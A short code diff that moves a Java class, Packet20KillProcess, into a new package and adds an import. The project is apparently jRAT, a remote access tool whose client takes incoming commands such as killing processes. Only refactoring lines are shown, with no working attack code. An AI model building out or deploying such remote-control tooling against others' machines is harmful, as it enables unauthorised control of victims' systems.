@@ -1,6 +1,7 @@
-package jrat.client.packets.incoming;
+package jrat.module.process;
 
 import jrat.client.Connection;
+import jrat.client.packets.incoming.AbstractIncomingPacket;
 import oslib.OperatingSystem;
 
 public class Packet20KillProcess extends AbstractIncomingPacket {
